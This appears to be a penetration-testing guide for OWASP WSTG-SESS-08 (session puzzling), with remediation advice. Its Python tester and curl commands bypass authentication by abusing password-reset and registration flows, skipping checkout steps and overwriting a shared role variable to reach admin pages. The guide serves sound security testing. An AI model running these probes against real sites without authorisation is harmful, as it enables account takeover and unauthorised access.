---
name: wstg-sess-08
description: "Testing for Session Puzzling"
category: session-management
owasp_id: WSTG-SESS-08
version: "1.0.0"
author: cyberstrike-official
tags: [session, cookies, csrf, token, wstg, sess]
tech_stack: []
cwe_ids: [CWE-200]
chains_with: [wstg-sess-01, wstg-sess-02]
prerequisites: [wstg-conf-03, wstg-conf-06]
severity_boost: {}
---

# wstg-sess-08

## Test ID

WSTG-SESS-08

## Test Name

Testing for Session Puzzling (Session Variable Overloading)

## High-Level Description

Session puzzling occurs when session variables are used for multiple purposes across different application flows. Attackers can manipulate session state in one flow to affect behavior in another, potentially bypassing authentication or authorization controls.

---

## What to Check

- [ ] Session variable reuse across flows
- [ ] Authentication bypass via flow manipulation
- [ ] State confusion attacks
- [ ] Password reset session abuse
- [ ] Registration flow exploitation

---

## How to Test

### Step 1: Identify Session Variables

```bash
# Track session variables across different flows
# 1. Login flow
# 2. Registration flow
# 3. Password reset flow
# 4. Account verification flow

# Look for common session variables:
# - user_id, email, username
# - authenticated, verified
# - role, permissions
# - step, stage, phase
```

### Step 2: Test Flow Manipulation

```python
#!/usr/bin/env python3
import requests

class SessionPuzzlingTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []

    def test_password_reset_bypass(self):
        """Test if password reset flow can bypass login"""
        print("[*] Testing password reset flow manipulation...")

        session = requests.Session()

        # Start password reset for target account
        session.post(f"{self.base_url}/forgot-password",
                    data={"email": "victim@example.com"})

        # Try to access authenticated areas without completing reset
        response = session.get(f"{self.base_url}/dashboard")

        if response.status_code == 200 and 'login' not in response.url.lower():
            print("[VULN] Access to dashboard via password reset flow!")
            self.findings.append({
                "issue": "Session puzzling via password reset",
                "severity": "Critical"
            })

    def test_registration_bypass(self):
        """Test if registration flow can bypass verification"""
        print("[*] Testing registration flow manipulation...")

        session = requests.Session()

        # Start registration
        session.post(f"{self.base_url}/register",
                    data={"email": "test@test.com", "password": "pass123"})

        # Try accessing without email verification
        response = session.get(f"{self.base_url}/dashboard")

        if response.status_code == 200:
            print("[VULN] Access without email verification!")

    def test_step_manipulation(self):
        """Test multi-step flow manipulation"""
        print("[*] Testing step manipulation...")

        session = requests.Session()

        # Skip to final step
        response = session.post(f"{self.base_url}/checkout/confirm",
                               data={"order_id": "12345"})

        if response.status_code == 200:
            print("[VULN] Checkout step bypass possible")

# Usage
tester = SessionPuzzlingTester("https://target.com")
tester.test_password_reset_bypass()
tester.test_registration_bypass()
tester.test_step_manipulation()
```

---

## Tools

| Tool                 | Description               | Usage                                     |
| --------------------- | ---------------------------- | -------------------------------------------- |
| **Burp Suite**        | Repeater/Sequencer            | Replay and reorder multi-step flow requests |
| **Postman**           | Flow scripting                | Chain requests, skip intermediate steps    |
| **OWASP ZAP**         | Manual explore + Fuzzer       | Manipulate session state between flows     |

---

## Example Commands/Payloads

```bash
# Start a password-reset flow, then probe for protected access without
# ever supplying the reset token (tests whether reset sets an auth-like session var)
curl -s -c cookies.txt -X POST "https://{target}/forgot-password" -d "email=victim@example.com"
curl -s -b cookies.txt "https://{target}/dashboard" | grep -qi "welcome" \
    && echo "[VULN] Dashboard accessible via unfinished password-reset flow"

# Start registration, then jump straight to an authenticated-only endpoint
# skipping the email-verification step
curl -s -c cookies.txt -X POST "https://{target}/register" -d "email=test@test.com&password=Passw0rd!"
curl -s -b cookies.txt "https://{target}/dashboard" | grep -qi "welcome" \
    && echo "[VULN] Access granted without completing email verification"

# Jump directly to a later step in a multi-step checkout/wizard flow
curl -s -c cookies.txt "https://{target}/checkout/start" -o /dev/null
curl -s -b cookies.txt -X POST "https://{target}/checkout/confirm" -d "order_id=12345" \
    | grep -qi "confirmed" && echo "[VULN] Checkout step-skip accepted"

# Pollute a shared session variable name across two different flows
curl -s -c cookies.txt -X POST "https://{target}/step1" -d "role=user"
curl -s -b cookies.txt -X POST "https://{target}/admin/step1" -d "role=admin"
curl -s -b cookies.txt "https://{target}/admin/dashboard"
```

---

## Remediation Guide

### Isolate Session Variables

```python
# Use separate namespaces for different flows
session['auth'] = {
    'user_id': user.id,
    'authenticated': True
}

session['password_reset'] = {
    'email': email,
    'token': token,
    'verified': False
}

# Never share variables between flows
# Clear flow-specific data when flow completes or is abandoned
```

---

## Risk Assessment

| Finding                           | CVSS | Severity |
| --------------------------------- | ---- | -------- |
| Auth bypass via flow manipulation | 9.8  | Critical |
| Step bypass in multi-step flow    | 7.5  | High     |

---

## CWE Categories

| CWE ID      | Title                                     |
| ----------- | ----------------------------------------- |
| **CWE-488** | Exposure of Data Element to Wrong Session |

---

## References

- [OWASP WSTG - Testing for Session Puzzling](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


---

## Checklist

```
[ ] Session variables mapped per flow
[ ] Password reset flow tested
[ ] Registration flow tested
[ ] Multi-step flows tested
[ ] Flow isolation verified
[ ] Findings documented
```
